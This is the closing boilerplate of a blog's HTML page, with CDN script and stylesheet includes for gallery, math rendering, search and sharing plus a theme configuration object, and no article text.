                <i class="fas fa-arrow-up fa-fw" aria-hidden="true"></i>
            </a><a href="#" id="view-comments" class="fixed-button" title="View Comments">
                <i class="fas fa-comment fa-fw" aria-hidden="true"></i>
            </a>
        </div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/lightgallery@2.4.0/css/lightgallery-bundle.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.15.3/dist/katex.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.15.3/dist/contrib/copy-tex.min.css"><script type="text/javascript" src="https://connect.facebook.net/en_US/sdk.js#xfbml=1&amp;version=v5.0&amp;appId=2950291851778582&amp;autoLogAppEvents=1" defer></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/autocomplete.js@0.38.1/dist/autocomplete.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lunr@2.3.9/lunr.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lazysizes@5.3.1/lazysizes.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lightgallery@2.4.0/lightgallery.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lightgallery@2.4.0/plugins/thumbnail/lg-thumbnail.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lightgallery@2.4.0/plugins/zoom/lg-zoom.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/sharer.js@0.5.1/sharer.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/katex@0.15.3/dist/katex.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/katex@0.15.3/dist/contrib/auto-render.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/katex@0.15.3/dist/contrib/copy-tex.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/katex@0.15.3/dist/contrib/mhchem.min.js"></script><script type="text/javascript">window.config={"code":{"maxShownLines":100},"comment":{"utterances":{"darkTheme":"github-dark","issueTerm":"pathname","label":"","lightTheme":"github-light","repo":"g03m0n/comments"}},"lightgallery":true,"math":{"delimiters":[{"display":true,"left":"$$","right":"$$"},{"display":true,"left":"\\[","right":"\\]"},{"display":true,"left":"\\begin{equation}","right":"\\end{equation}"},{"display":true,"left":"\\begin{equation*}","right":"\\end{equation*}"},{"display":true,"left":"\\begin{align}","right":"\\end{align}"},{"display":true,"left":"\\begin{align*}","right":"\\end{align*}"},{"display":true,"left":"\\begin{alignat}","right":"\\end{alignat}"},{"display":true,"left":"\\begin{alignat*}","right":"\\end{alignat*}"},{"display":true,"left":"\\begin{gather}","right":"\\end{gather}"},{"display":true,"left":"\\begin{CD}","right":"\\end{CD}"},{"display":false,"left":"$","right":"$"},{"display":false,"left":"\\(","right":"\\)"}],"strict":false},"search":{"highlightTag":"em","maxResultLength":20,"noResultsFound":"No results found","snippetLength":30}};</script><script type="text/javascript" src="/js/theme.min.js"></script></body>
</html>
